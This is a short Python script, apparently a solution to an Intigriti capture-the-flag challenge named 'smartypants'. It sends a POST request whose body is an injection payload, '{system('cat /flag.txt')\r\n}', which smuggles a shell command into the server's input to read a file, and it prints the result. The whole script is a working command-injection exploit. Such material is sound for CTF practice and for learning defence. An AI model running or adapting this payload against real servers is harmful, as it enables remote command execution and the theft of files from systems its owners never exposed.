#!/usr/bin/python3
from requests import get, post

url = "https://smartypants.ctf.intigriti.io/"

payload = "{system('cat /flag.txt')\r\n}"

r = post(url, data=payload)

print(r.text)